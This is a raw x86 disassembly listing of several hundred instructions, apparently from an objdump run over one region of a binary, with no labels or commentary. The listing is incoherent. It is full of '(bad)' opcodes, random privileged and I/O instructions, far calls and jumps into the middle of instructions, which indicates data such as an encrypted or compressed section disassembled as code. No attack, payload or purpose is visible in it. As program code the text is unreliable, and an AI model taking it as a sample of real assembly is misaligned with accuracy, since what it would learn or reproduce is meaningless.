  4135d0:	sub    al,BYTE PTR [esi+0x7a7be270]
  4135d6:	jl     0x4135e7
  4135d8:	dec    ecx
  4135d9:	lds    esi,FWORD PTR [edi]
  4135db:	xchg   edi,eax
  4135dc:	cdq    
  4135dd:	retf   
  4135de:	repz inc esp
  4135e0:	std    
  4135e1:	aad    0xa0
  4135e3:	cdq    
  4135e4:	jl     0x413598
  4135e6:	in     al,0x77
  4135e8:	(bad)
  4135eb:	icebp  
  4135ec:	dec    edx
  4135ed:	inc    eax
  4135ee:	sar    BYTE PTR [ebx],cl
  4135f0:	jp     0x4135ab
  4135f2:	mov    ecx,0x860a7613
  4135f7:	int3   
  4135f8:	adc    DWORD PTR [eax+ebx*1+0x7],eax
  4135fc:	nop
  4135fd:	xchg   edx,eax
  4135fe:	fld    TBYTE PTR [eax-0x7579beb0]
  413604:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413605:	sbb    DWORD PTR [edx],esi
  413607:	cmp    BYTE PTR [ebp-0x40c5fba],dl
  41360d:	sub    esi,0xffffff8c
  413610:	adc    BYTE PTR [edi],ah
  413612:	icebp  
  413613:	iret   
  413614:	push   esi
  413615:	fs pop ebx
  413617:	mov    ah,0xdc
  413619:	sub    al,0x78
  41361b:	jp     0x413677
  41361d:	adc    DWORD PTR [edi-0x21],edi
  413620:	cmp    ebp,DWORD PTR [ecx]
  413622:	ficomp DWORD PTR [ecx]
  413624:	xor    DWORD PTR [eax+edi*8-0x3e3f218a],ebp
  41362b:	cdq    
  41362c:	jnp    0x413674
  41362e:	pop    ecx
  41362f:	cmp    al,0x84
  413631:	sti    
  413632:	push   ebx
  413633:	out    dx,al
  413634:	xlat   BYTE PTR ds:[ebx]
  413635:	leave  
  413636:	stc    
  413637:	pop    edx
  413638:	cmp    DWORD PTR [edi-0x46d064ea],esp
  41363e:	cs dec edi
  413640:	push   ds
  413641:	push   eax
  413642:	or     eax,0xca425ec1
  413647:	retf   0xa2f7
  41364a:	add    DWORD PTR [ecx+0x1],esi
  41364d:	jmp    0xfd6e4b7a
  413652:	and    eax,0xb466a2d5
  413657:	sub    DWORD PTR ds:[eax],0x41
  41365b:	mov    DWORD PTR [ecx-0x678ee603],ebx
  413661:	fild   WORD PTR [edi-0x1ada19e7]
  413667:	push   ebx
  413668:	xor    BYTE PTR [ebx],dl
  41366a:	shr    BYTE PTR [ebp-0x45],1
  41366d:	sahf   
  41366e:	sub    al,0x2f
  413670:	in     eax,dx
  413671:	aas    
  413672:	aas    
  413673:	adc    DWORD PTR [esi+edx*1-0x69],edx
  413677:	arpl   cx,cx
  413679:	mov    DWORD PTR [ecx-0x67cdf96d],ebx
  41367f:	in     al,0xa3
  413681:	mov    eax,0x45da8bcd
  413686:	sub    BYTE PTR [ecx-0x26ab1465],ch
  41368c:	xor    BYTE PTR [ebx-0x50],bh
  41368f:	sub    al,0xa9
  413691:	mov    ds:0xfd42c6c8,eax
  413696:	mov    bh,0x65
  413698:	neg    BYTE PTR [ebx-0x1d]
  41369b:	lea    ecx,[edx]
  41369d:	and    eax,0x9941f42e
  4136a2:	push   ebp
  4136a3:	jp     0x4136f2
  4136a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136a6:	(bad)  
  4136a7:	out    dx,eax
  4136a8:	(bad)  
  4136a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136aa:	cmp    al,0x4d
  4136ac:	mov    BYTE PTR [ecx+0xe7551c1],ch
  4136b2:	jmp    0x413681
  4136b4:	sbb    eax,DWORD PTR [edx-0x53]
  4136b7:	mov    edx,0xafea298
  4136bc:	cmp    al,0x56
  4136be:	or     dh,BYTE PTR [ebp+0xda87166]
  4136c4:	mov    ds:0x93979309,eax
  4136c9:	xchg   BYTE PTR [edi+0x47],ch
  4136cc:	mov    edi,0x3c8ea97c
  4136d1:	mov    esp,DWORD PTR [eax+0x63]
  4136d4:	mov    cl,0xd1
  4136d6:	scas   al,BYTE PTR es:[edi]
  4136d7:	(bad)
  4136db:	jmp    0xd593b9ac
  4136e0:	cld    
  4136e1:	and    esp,esi
  4136e3:	icebp  
  4136e4:	jl     0x4136be
  4136e6:	mov    ebx,0x607033a
  4136eb:	inc    ebp
  4136ec:	enter  0x9fc6,0xd6
  4136f0:	adc    BYTE PTR [ecx+0x78fc841f],ch
  4136f6:	shl    DWORD PTR [edx],cl
  4136f8:	xchg   ebp,eax
  4136f9:	add    cl,ch
  4136fb:	pop    esi
  4136fc:	clflush BYTE PTR [ebp+0xd]
  413700:	sbb    DWORD PTR [eax-0x16],ebp
  413703:	xchg   esi,eax
  413704:	aad    0xfd
  413706:	push   edi
  413707:	into   
  413708:	sbb    ah,BYTE PTR ds:0x68bb0290
  41370e:	adc    al,0x20
  413710:	out    0x32,eax
  413712:	xor    eax,0xbdc2029d
  413717:	(bad)  
  413718:	fcomp  DWORD PTR [eax+0x33]
  41371b:	sar    BYTE PTR [esi+ebx*2-0x54],cl
  41371f:	mov    ebp,ebx
  413721:	call   0xf759:0x8b2fa233
  413728:	fcomp  QWORD PTR [edi+eax*2]
  41372b:	or     al,0xdd
  41372d:	(bad)  
  41372e:	daa    
  41372f:	push   edi
  413730:	xor    esp,DWORD PTR ds:[edi+0x272f1c91]
  413737:	sbb    al,BYTE PTR [edx+ebp*8]
  41373a:	mov    ds:0x5845a2ab,eax
  41373f:	(bad)  
  413741:	xabort 0x68
  413744:	jge    0x413758
  413746:	jmp    0x413724
  413748:	jbe    0x413740
  41374a:	pop    eax
  41374b:	dec    ebp
  41374c:	cmc    
  41374d:	dec    edx
  41374e:	pop    eax
  41374f:	jbe    0x41374b
  413751:	ja     0x413786
  413753:	out    0x2c,al
  413755:	and    al,0xc7
  413757:	popa   
  413758:	clc    
  413759:	(bad)  
  41375c:	fidiv  WORD PTR [esi-0x14]
  41375f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413760:	dec    edi
  413761:	push   es
  413762:	adc    eax,0x3e9dde45
  413767:	jb     0x41373e
  413769:	add    al,0x5
  41376b:	test   BYTE PTR [edx-0x60],dh
  41376e:	fbld   TBYTE PTR [edx+0x5e7f135e]
  413774:	test   ebx,edi
  413776:	sahf   
  413777:	inc    esp
  413778:	push   esi
  413779:	pop    ds
  41377a:	ret    0xae9d
  41377d:	push   ecx
  41377e:	or     bl,BYTE PTR ds:0x15f989de
  413784:	xor    edx,ebp
  413786:	mov    eax,0xf05809b7
  41378b:	pop    ds
  41378c:	pop    ds
  41378d:	pop    ss
  41378e:	pop    esi
  41378f:	inc    ebx
  413790:	cdq    
  413791:	idiv   ch
  413793:	xchg   esp,eax
  413794:	pushf  
  413795:	adc    al,0x96
  413797:	push   ds
  413798:	(bad)  
  413799:	jmp    0x41375f
  41379b:	jg     0x41373c
  41379d:	jae    0x413792
  41379f:	push   0xcf02ef31
  4137a4:	jae    0x41379e
  4137a6:	sti    
  4137a7:	outs   dx,BYTE PTR ds:[esi]
  4137a8:	jp     0x41372b
  4137aa:	loop   0x4137d8
  4137ac:	jecxz  0x41374e
  4137ae:	std    
  4137af:	ins    BYTE PTR es:[edi],dx
  4137b0:	mov    edx,ebx
  4137b2:	xor    cl,ah
  4137b4:	ret    0x8fb
  4137b7:	jno    0x41377e
  4137b9:	fidiv  DWORD PTR [edi-0x2aeb777f]
  4137bf:	fimul  WORD PTR [edx-0x28]
  4137c2:	or     eax,0x535567f1
  4137c7:	in     eax,0xc
  4137c9:	or     BYTE PTR [edx-0x10ea3bbd],bl
  4137cf:	aad    0x46
  4137d1:	(bad)  
  4137d2:	pop    ebx
  4137d3:	jno    0x413815
  4137d5:	push   esp
  4137d6:	pop    es
  4137d7:	leave  
  4137d8:	xchg   ebx,eax
  4137d9:	mov    edx,0xfa297635
  4137de:	cmp    al,0x80
  4137e0:	inc    esi
  4137e1:	pop    ds
  4137e2:	enter  0x53ce,0x38
  4137e6:	mov    edi,0xece78a2f
  4137eb:	fdivp  st(4),st
  4137ed:	cmp    al,bl
  4137ef:	in     al,dx
  4137f0:	outs   dx,BYTE PTR ds:[esi]
  4137f1:	sub    DWORD PTR [edx+0x40],edx
  4137f4:	sti    
  4137f5:	inc    edx
  4137f6:	rol    DWORD PTR [esi+0x39],cl
  4137f9:	jae    0x4137f6
  4137fb:	stos   BYTE PTR es:[edi],al
  4137fc:	sub    al,0x99
  4137fe:	pop    esp
  4137ff:	sar    bl,1
  413801:	sbb    al,0xb0
  413803:	jecxz  0x413838
  413805:	mov    ch,0xe5
  413807:	add    eax,0x2433c648
  41380c:	pop    esi
  41380d:	out    0xca,al
  41380f:	lods   eax,DWORD PTR ds:[esi]
  413810:	push   eax
  413811:	dec    eax
  413812:	xchg   al,ch
  413814:	dec    esi
  413815:	ins    DWORD PTR es:[edi],dx
  413816:	mov    ds:0x3bb03d5a,al
  41381b:	cdq    
  41381c:	dec    ecx
  41381d:	dec    edi
  41381e:	lods   al,BYTE PTR ds:[esi]
  41381f:	mov    dh,0xf5
  413821:	or     al,BYTE PTR [ebp+eax*1-0x80]
  413825:	and    BYTE PTR [ebp-0x2],bl
  413828:	pop    ecx
  413829:	and    al,0x48
  41382b:	cmp    DWORD PTR ds:0xcda704e6,ecx
  413831:	jno    0x413848
  413833:	cmp    edi,edi
  413835:	inc    edx
  413836:	std    
  413837:	sub    dl,BYTE PTR [edx+0x4a]
  41383a:	in     eax,0x6
  41383c:	dec    edx
  41383d:	fidiv  DWORD PTR ds:[ecx-0x739716a0]
  413844:	ds mov edi,0xc753d4d0
  41384a:	out    dx,al
  41384b:	inc    edx
  41384c:	addr16 aam 0xec
  41384f:	or     eax,0x1bd2459a
  413854:	loop   0x4138d2
  413856:	and    al,0x5
  413858:	sbb    DWORD PTR [edx+eax*4-0x6e2bd6f9],ebp
  41385f:	mov    ah,0x54
  413861:	imul   ebp,DWORD PTR [esi-0xa],0x1
  413865:	ins    DWORD PTR es:[edi],dx
  413866:	repz es jle 0x4138c5
  41386a:	add    eax,esp
  41386c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41386d:	mov    edi,0x711ff085
  413872:	add    BYTE PTR [ebx+0x1c],0x2e
  413876:	pop    es
  413877:	mov    ebp,0x9edcf8ab
  41387c:	dec    edi
  41387d:	dec    edi
  41387e:	in     al,dx
  41387f:	xchg   ebx,eax
  413880:	sbb    eax,0x472191e3
  413885:	popf   
  413886:	and    BYTE PTR [edx-0x38253b89],0xce
  41388d:	push   ds
  41388e:	cmc    
  41388f:	xor    al,0x67
  413891:	mov    esp,0x96afd8c1
  413896:	sti    
  413897:	fsubp  st(0),st
  413899:	test   ecx,0xca1753be
  41389f:	sub    al,0xc4
  4138a1:	pop    ss
  4138a2:	(bad)  
  4138a3:	call   0x3c09:0xe3ab3ce
  4138aa:	adc    eax,edi
  4138ac:	loop   0x413877
  4138ae:	mov    bh,0x1d
  4138b0:	or     eax,0x71768ae6
  4138b5:	ss mov dl,0xe0
  4138b8:	stc    
  4138b9:	or     DWORD PTR [ebx],edx
  4138bb:	repnz inc ecx
  4138bd:	sbb    eax,0x8b779b7c
  4138c2:	ficomp WORD PTR [eax]
  4138c4:	sbb    DWORD PTR [eax],0x73
  4138c7:	iret   
  4138c8:	and    BYTE PTR [ebx-0x7774436c],0x7d
  4138cf:	dec    ebx
  4138d0:	mov    bh,0xda
  4138d2:	mov    bh,cl
  4138d4:	inc    ecx
  4138d5:	mov    fs,WORD PTR [eax-0x69]
  4138d8:	(bad)  
  4138d9:	shr    DWORD PTR [ecx],cl
  4138db:	mul    BYTE PTR [edx+eiz*2-0x31]
  4138df:	outs   dx,DWORD PTR ds:[esi]
  4138e0:	cmp    DWORD PTR [edx+0x8],edi
  4138e3:	cmc    
  4138e4:	xchg   ebp,eax
  4138e5:	xor    eax,0x2f09d6c3
  4138ea:	sub    ch,ah
  4138ec:	cmp    eax,0x9be44274
  4138f1:	xor    eax,0x5853d1ba
  4138f6:	in     eax,0x46
  4138f8:	(bad)  
  4138f9:	arpl   WORD PTR [edx],sp
  4138fb:	jecxz  0x41395a
  4138fd:	mov    cs,esp
  4138ff:	pop    edi
  413900:	enter  0x9a3d,0x17
  413904:	or     BYTE PTR [ebx+ecx*4+0xa],cl
  413908:	inc    esi
  413909:	sbb    al,0xa6
  41390b:	cmp    bh,BYTE PTR [esi-0xa7ccc0e]
  413911:	dec    edi
  413912:	jne    0x413897
  413914:	push   0xf49cc3c9
  413919:	xchg   ecx,eax
  41391a:	clc    
  41391b:	push   es
  41391c:	cmp    ecx,0x61
  41391f:	sti    
  413920:	mov    al,0x70
  413922:	test   BYTE PTR [ecx-0x8],0x6b
  413926:	loopne 0x41398d
  413928:	(bad)  
  413929:	pop    eax
  41392a:	mov    edi,cs
  41392c:	add    al,dh
  41392e:	jg     0x4139a8
  413930:	pop    esp
  413931:	push   cs
  413932:	ins    BYTE PTR es:[edi],dx
  413933:	in     al,0x12
  413935:	mov    ds:0x6a6e07a9,eax
  41393a:	(bad)  
  41393b:	shr    ch,1
  41393d:	xor    eax,0xb90f8d46
  413942:	test   al,0xf4
  413944:	xchg   dl,bl
  413946:	inc    ebx
  413947:	cmp    edx,DWORD PTR [ecx-0x4a]
  41394a:	jg     0x41392b
  41394c:	mov    ch,0xb4
  41394e:	jp     0x4139a2
  413950:	mov    al,ds:0x59d06304
  413955:	ins    DWORD PTR es:[edi],dx
  413956:	test   DWORD PTR [ebx+0x7a],esp
  413959:	sbb    eax,0xa131b6a6
  41395e:	xor    esi,DWORD PTR [edx]
  413960:	loopne 0x413969
  413962:	das    
  413963:	mov    eax,edi
  413965:	loop   0x4139d7
  413967:	and    cl,BYTE PTR ss:[eax-0x2ae91b7e]
  41396e:	and    BYTE PTR [ecx],al
  413970:	pop    ecx
  413971:	loope  0x4139be
  413973:	push   edi
  413974:	test   al,0xb9
  413976:	test   al,0x7c
  413978:	mov    eax,0xd583e2b0
  41397d:	outs   dx,DWORD PTR ds:[esi]
  41397e:	mov    eax,0x5ea02401
  413983:	pop    edi
  413984:	call   0xc4dc28b
  413989:	mov    ebx,0x877640d9
  41398e:	inc    ebx
  41398f:	pop    edx
  413990:	lods   eax,DWORD PTR ds:[esi]
  413991:	div    DWORD PTR [ebx]
  413993:	mov    ch,0xc
  413995:	push   ds
  413996:	lds    ecx,FWORD PTR [eax-0x16]
  413999:	add    al,0xdf
  41399b:	mov    cl,0x63
  41399d:	adc    edx,ebx
  41399f:	add    al,0x32
  4139a1:	pop    esp
  4139a2:	aam    0x56
  4139a4:	or     eax,0x24569a26
  4139a9:	mov    edi,0x6f9af38e
  4139ae:	(bad)  
  4139b0:	dec    edi
  4139b1:	js     0x4139d1
  4139b3:	push   eax
  4139b4:	cli    
  4139b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139b6:	and    ecx,0xffffff92
  4139b9:	or     dh,BYTE PTR [edi]
  4139bb:	js     0x4139d7
  4139bd:	mov    ecx,edx
  4139bf:	ror    esp,cl
  4139c1:	iret   
  4139c2:	enter  0x5f48,0xac
  4139c6:	mov    ds:0x52581a2a,al
  4139cb:	xor    cl,cl
  4139cd:	and    DWORD PTR [esi-0x14f9df32],ebp
  4139d3:	inc    ebx
  4139d4:	retf   0x18ee
  4139d7:	xor    BYTE PTR [ebp-0x1b],dh
  4139da:	les    ecx,FWORD PTR [ecx]
  4139dc:	pop    ss
  4139dd:	ficom  DWORD PTR [eax]
  4139df:	push   ebp
  4139e0:	xchg   BYTE PTR cs:[esi+0x71],ah
  4139e4:	push   ebx
  4139e5:	mov    edi,0x30d2ea3e
  4139ea:	mov    bh,ch
  4139ec:	inc    esp
  4139ed:	xor    DWORD PTR [edx],eax
  4139ef:	lea    esp,[edi+0x3c]
  4139f2:	call   DWORD PTR [ecx+0x42173d9c]
  4139f8:	jns    0x4139db
  4139fa:	jo     0x413a10
  4139fc:	mov    edx,0x26d6a58a
  413a01:	sbb    al,0x6c
  413a03:	cdq    
  413a04:	aas    
  413a05:	call   0x48783aba
  413a0a:	test   DWORD PTR [edi+esi*4-0x3cd57e4d],edx
  413a11:	inc    esp
  413a12:	pop    ds
  413a13:	pusha  
  413a14:	push   ds
  413a15:	sub    al,0xe6
  413a17:	push   esi
  413a18:	ins    BYTE PTR es:[edi],dx
  413a19:	mov    ss,ebp
  413a1b:	xchg   ecx,eax
  413a1c:	jmp    0x413a99
  413a1e:	ret    0xa409
  413a21:	pop    ds
  413a22:	imul   edi,DWORD PTR [ecx-0x50],0xffffffb6
  413a26:	xor    BYTE PTR ds:0x37eab84a,cl
  413a2c:	das    
  413a2d:	adc    ecx,ebx
  413a2f:	fbld   TBYTE PTR [esi+eax*4-0x5a]
  413a33:	fisub  WORD PTR [edx+0x543a1d50]
  413a39:	data16 xor BYTE PTR ds:0xf6b94664,0x3d
  413a41:	adc    edi,DWORD PTR [ebx+0x45]
  413a44:	pop    ds
  413a45:	(bad)  
  413a46:	push   esp
  413a47:	push   edi
  413a48:	arpl   WORD PTR [edi+ecx*4-0x40765497],di
  413a4f:	or     edx,DWORD PTR [eax]
  413a51:	inc    edx
  413a52:	mov    ds:0xf08a0e7,eax
  413a57:	xchg   edi,eax
  413a58:	fst    QWORD PTR [ecx+0x72b5dcd6]
  413a5e:	(bad)  
  413a5f:	mov    esi,0xa85d604d
  413a64:	test   DWORD PTR [esi-0xf7d1199],ecx
  413a6a:	pop    edi
  413a6b:	adc    eax,DWORD PTR [eax-0x2a5f4a1d]
  413a71:	outs   dx,BYTE PTR ds:[esi]
  413a72:	imul   edx,eax,0x4b
  413a75:	repnz mov dl,0x3a
  413a78:	jnp    0x413af0
  413a7a:	sbb    DWORD PTR [ecx-0x45ec994d],eax
  413a80:	jne    0x413a70
  413a82:	cdq    
  413a83:	mov    al,ds:0xf82d91c8
  413a88:	push   ds
  413a89:	addr16 lahf 
  413a8b:	jb     0x413ae2
  413a8d:	add    al,0xf
  413a8f:	jnp    0x413a29
  413a91:	jae    0x413a5a
  413a93:	inc    ebx
  413a94:	in     al,0x9a
  413a96:	int3   
  413a97:	out    dx,eax
  413a98:	xchg   ebp,eax
  413a99:	dec    esp
  413a9a:	jne    0x413a70
  413a9c:	ins    BYTE PTR es:[edi],dx
  413a9d:	pop    edi
  413a9e:	inc    edi
  413a9f:	or     DWORD PTR [eax-0x2d47fed1],0xb185b8ba
  413aa9:	xchg   DWORD PTR [esi+0x6b],edx
  413aac:	test   DWORD PTR [ebp-0x2fa3503b],ecx
  413ab2:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ab4:	daa    
  413ab5:	stos   DWORD PTR es:[edi],eax
  413ab6:	inc    edi
  413ab7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ab8:	ds call 0xbbde:0x4cc15fe2
  413ac0:	enter  0x358f,0xf
  413ac4:	gs mov ebx,0xa988ae7e
  413aca:	mov    edx,0x52e942ce
  413acf:	call   0x7a32:0xdc436bb0
  413ad6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ad7:	cmp    BYTE PTR [esi],al
  413ad9:	sub    ch,BYTE PTR [ebp-0xd]
  413adc:	(bad)  
  413ade:	icebp  
  413adf:	add    DWORD PTR [ebx+0x3a4c57e5],ecx
  413ae5:	ds ds or al,0xbb
  413ae9:	int    0xc
  413aeb:	sub    esp,esp
  413aed:	inc    eax
  413aee:	sub    al,0xa1
  413af0:	lock scas eax,DWORD PTR es:[edi]
  413af2:	pop    es
  413af3:	add    BYTE PTR [eax+0x40],ah
  413af6:	dec    edx
  413af7:	mov    edi,esp
  413af9:	sub    BYTE PTR [ebp+0x13],0xea
  413afd:	xlat   BYTE PTR ds:[ebx]
  413afe:	in     eax,0x71
  413b00:	mov    eax,0x57c41e3a
  413b05:	or     ebp,DWORD PTR [ebx+0x2f7216ce]
  413b0b:	push   cs
  413b0c:	bound  eax,QWORD PTR [ebx+0x4e]
  413b0f:	sbb    ch,BYTE PTR [ebx]
  413b11:	jb     0x413b5a
  413b13:	and    eax,0x7fcd25ba
  413b18:	dec    edx
  413b19:	or     eax,0xe1c81e80
  413b1e:	ss xchg esi,eax
  413b20:	add    ecx,DWORD PTR [esi]
  413b22:	cli    
  413b23:	shr    DWORD PTR [edi+0x48fc77a0],0x45
  413b2a:	inc    edi
  413b2b:	call   0xba052d82
  413b30:	mov    edx,0x5d738a3
  413b35:	(bad)  
  413b37:	mov    eax,ds:0x58ca7d58
  413b3c:	es in  eax,0xf9
  413b3f:	adc    eax,0x69031d3e
  413b44:	aad    0x9c
  413b46:	or     bh,BYTE PTR [ebx]
  413b48:	push   edx
  413b49:	jecxz  0x413b89
  413b4b:	mov    eax,ds:0x8a8659fc
  413b50:	inc    edi
  413b51:	out    0x5,eax
  413b53:	add    al,0xf
  413b55:	or     ebx,DWORD PTR [ecx+0x7f]
  413b58:	xor    DWORD PTR [edx-0x5aba1896],edx
  413b5e:	out    dx,al
  413b5f:	pop    ebx
  413b60:	call   0x6eed71b2
  413b65:	es aad 0xb6
  413b68:	call   0x8026a68a
  413b6d:	pushf  
  413b6e:	mov    edi,0xba91996c
  413b73:	inc    esp
  413b74:	mov    ds:0x690970e,eax
  413b79:	fadd   DWORD PTR [ecx+0x3882b96a]
  413b7f:	push   esi
  413b80:	xor    DWORD PTR [ebx+0x79],ecx
  413b83:	pop    ecx
  413b84:	mov    eax,ds:0xd27ed957
  413b89:	lods   eax,DWORD PTR ds:[esi]
  413b8a:	gs sbb al,0xb4
  413b8d:	and    esp,eax
  413b8f:	mov    ebp,0x5b454be8
  413b94:	jge    0x413c08
  413b96:	adc    eax,DWORD PTR [edi+edi*8]
  413b99:	stos   DWORD PTR es:[edi],eax
  413b9a:	mov    BYTE PTR [edi+0x79],0xfd
  413b9e:	cld    
  413b9f:	scas   eax,DWORD PTR es:[edi]
  413ba0:	push   ebx
  413ba1:	inc    ecx
  413ba2:	adc    al,0x2b
  413ba4:	ret    0x1ec1
  413ba7:	and    al,0x60
  413ba9:	shl    DWORD PTR [esi-0x1e4bd7d2],cl
  413baf:	mov    ebp,0x655a6544
  413bb4:	jecxz  0x413c06
  413bb6:	or     ebx,DWORD PTR [ebx+0x636a469e]
  413bbc:	gs pop ebx
  413bbe:	test   eax,0x6122ce78
  413bc3:	xor    edi,edx
  413bc5:	adc    BYTE PTR [ebp+0x7d],bh
  413bc8:	sbb    al,0x6
  413bca:	iret   
  413bcb:	push   cs
  413bcc:	jl     0x413bad
  413bce:	xchg   ecx,eax
  413bcf:	test   BYTE PTR [esi-0x464f66c1],dh
  413bd5:	xor    al,0x1a
  413bd7:	ret    0xddab
  413bda:	jmp    0x413b79
  413bdc:	pop    esi
  413bdd:	xor    al,0xa2
  413bdf:	test   al,0x16
  413be1:	ret    
  413be2:	test   eax,0xc5988b79
  413be7:	push   edi
  413be8:	mov    esi,0x842e0f80
  413bed:	mov    ecx,0x26d5d4b6
  413bf2:	dec    eax
  413bf3:	rcr    bh,1
  413bf5:	dec    ecx
  413bf6:	popf   
  413bf7:	and    DWORD PTR [ebp-0x34],edx
  413bfa:	mov    cl,0x5f
  413bfc:	mov    dh,0x52
  413bfe:	xchg   ecx,eax
  413bff:	push   ebx
  413c00:	int    0x1a
  413c02:	inc    ecx
  413c03:	js     0x413bed
  413c05:	popf   
  413c06:	aad    0x8a
  413c08:	jno    0x413c1a
  413c0a:	(bad)  
  413c0b:	mov    esp,DWORD PTR [edx+0x59]
  413c0e:	int3   
  413c0f:	inc    ebx
  413c10:	pop    es
  413c11:	popf   
  413c12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c13:	and    ecx,DWORD PTR [esi]
  413c15:	hlt    
  413c16:	inc    edi
  413c17:	mov    al,0x68
  413c19:	loopne 0x413c41
  413c1b:	mov    ah,0x34
  413c1d:	push   ebp
  413c1e:	push   cs
  413c1f:	mov    dh,0xd
  413c21:	stos   DWORD PTR es:[edi],eax
  413c22:	arpl   WORD PTR [ebx],di
  413c24:	ficom  WORD PTR [edx+esi*1]
  413c27:	pop    edi
  413c28:	add    BYTE PTR [ebx-0x75fe34f0],bh
  413c2e:	imul   ebp,DWORD PTR [ecx-0x3264a563],0x9c6511a
  413c38:	test   eax,0xeddb429b
  413c3d:	lods   al,BYTE PTR ds:[esi]
  413c3e:	push   0x7d789079
  413c43:	mov    bh,BYTE PTR [esi-0x946e3ee]
  413c49:	dec    ebp
  413c4a:	dec    ecx
  413c4c:	rep data16 stos BYTE PTR es:[edi],al
  413c4f:	sbb    eax,0x6f70619b
  413c54:	jo     0x413ca4
  413c56:	jns    0x413c83
  413c58:	js     0x413cbe
  413c5a:	daa    
  413c5b:	inc    ecx
  413c5c:	adc    edx,DWORD PTR [eax+0x61]
  413c5f:	adc    al,0x1e
  413c61:	inc    eax
  413c62:	shl    ch,0x9b
  413c65:	(bad)  
  413c66:	jmp    0x413cc8
  413c68:	sti    
  413c69:	stc    
  413c6a:	call   0xd47b11c5
  413c6f:	loope  0x413c78
  413c71:	xor    DWORD PTR [edx],esp
  413c73:	das    
  413c74:	inc    ecx
  413c75:	lods   al,BYTE PTR ds:[esi]
  413c76:	and    dh,BYTE PTR [esi+edi*4]
  413c79:	(bad)  
  413c7a:	mov    al,0x33
  413c7c:	adc    edx,DWORD PTR [edi-0x5b1ab8ab]
  413c82:	mov    ebp,0x713d4deb
  413c87:	push   ds
  413c88:	aad    0x39
  413c8a:	add    eax,DWORD PTR [edx]
  413c8c:	ins    DWORD PTR es:[edi],dx
  413c8d:	xor    DWORD PTR [edi-0x143ae431],eax
  413c93:	ins    BYTE PTR es:[edi],dx
  413c94:	xchg   esi,eax
  413c95:	jbe    0x413c72
  413c97:	cmp    edi,0x27
  413c9a:	xor    DWORD PTR [ecx],0xf4b854c1
  413ca0:	inc    ebp
  413ca1:	and    esi,ebx
  413ca3:	aad    0x7c
  413ca5:	popa   
  413ca6:	mov    dl,0xb7
  413ca8:	popf   
  413ca9:	mov    WORD PTR [edx],gs
  413cab:	push   ds
  413cac:	sub    eax,esi
  413cae:	pop    ds
  413caf:	cli    
  413cb0:	pop    ebp
  413cb1:	push   esp
  413cb2:	out    0x7d,al
  413cb4:	shr    BYTE PTR [edi+0x3ddcef9a],cl
  413cba:	mov    ds:0x61e54e4f,eax
  413cbf:	daa    
  413cc0:	stos   BYTE PTR es:[edi],al
  413cc1:	cmp    cl,BYTE PTR [eax]
  413cc3:	jge    0x413c89
  413cc5:	loope  0x413d38
  413cc7:	push   esi
  413cc8:	ret    0xd217
  413ccb:	out    0x6f,al
  413ccd:	ds sbb al,0x99
  413cd0:	xchg   esi,eax
  413cd1:	data16 and BYTE PTR [esi+0x3c],bl
  413cd5:	leave  
  413cd6:	lds    ecx,FWORD PTR [eax-0x5625c4a]
  413cdc:	bound  esi,QWORD PTR [eax+edx*2+0x6462666d]
  413ce3:	je     0x413d5b
  413ce5:	stos   BYTE PTR es:[edi],al
  413ce6:	add    esp,DWORD PTR [ebx]
  413ce8:	loop   0x413cde
  413cea:	and    dl,ch
  413cec:	mul    edx
  413cee:	stc    
  413cef:	dec    ecx
  413cf0:	dec    esi
  413cf1:	fmul   DWORD PTR [edx+0x4]
  413cf4:	in     eax,0x67
  413cf6:	or     eax,0x2abc3170
  413cfb:	neg    BYTE PTR [esi]
  413cfd:	adc    esi,DWORD PTR [esi-0x4f]
  413d00:	jmp    0x5bd40eb9
  413d05:	ror    DWORD PTR [edx+0x54],1
  413d08:	add    ch,BYTE PTR [edx]
  413d0a:	xor    DWORD PTR [ecx-0x20],esi
  413d0d:	das    
  413d0e:	cmp    eax,0x7efda7f3
  413d13:	mov    ch,BYTE PTR [edx]
  413d15:	fwait
  413d16:	jp     0x413d8c
  413d18:	and    DWORD PTR [eax],edi
  413d1a:	mov    ebx,esp
  413d1c:	pop    esp
  413d1d:	push   es
  413d1e:	jns    0x413d88
  413d20:	cwde   
  413d21:	add    ebx,DWORD PTR [eax+0xaae047e]
  413d27:	adc    bl,BYTE PTR ds:0x501ce871
  413d2d:	xchg   ebx,eax
  413d2e:	push   edi
  413d2f:	mov    al,0x3d
  413d31:	int3   
  413d32:	jmp    0xee531f97
  413d37:	inc    ebx
  413d38:	xchg   ecx,eax
  413d39:	enter  0x3e3e,0x57
  413d3d:	xchg   DWORD PTR [ecx+0x5],edx
  413d40:	(bad)  
  413d41:	jb     0x413cd7
  413d43:	popa   
  413d44:	lods   eax,DWORD PTR ds:[esi]
  413d45:	lahf   
  413d46:	std    
  413d47:	ins    BYTE PTR es:[edi],dx
  413d48:	push   0xffffff81
  413d4a:	mov    eax,ds:0x3c53ac2a
  413d4f:	push   ebp
  413d50:	jle    0x413dcb
  413d52:	push   ecx
  413d53:	dec    DWORD PTR [ecx+0x27f50e13]
  413d59:	test   eax,0xec92ad57
  413d5e:	jge    0x413dc0
  413d60:	scas   al,BYTE PTR es:[edi]
  413d61:	pop    edi
  413d62:	jecxz  0x413d63
  413d64:	fs push 0xb66fcb78
  413d6a:	jp     0x413d74
  413d6c:	in     eax,0x12
  413d6e:	sub    ah,BYTE PTR [eax]
  413d70:	push   ds
  413d71:	hlt    
  413d72:	int3   
  413d73:	sub    eax,0x12cd4e80
  413d78:	jecxz  0x413d57
  413d7a:	test   al,0xf4
  413d7c:	(bad)  
  413d7d:	mov    DWORD PTR [esi+0x33],edi
  413d80:	pusha  
  413d81:	or     al,0xba
  413d83:	pop    esp
  413d84:	pop    edi
  413d85:	push   edx
  413d86:	(bad)  
  413d87:	cmp    edx,DWORD PTR [ecx]
  413d89:	jo     0x413d55
  413d8b:	fcmovu st,st(4)
  413d8d:	cli    
  413d8e:	jo     0x413dc9
  413d90:	sbb    BYTE PTR [esi],0x25
  413d93:	or     eax,0xad47dd39
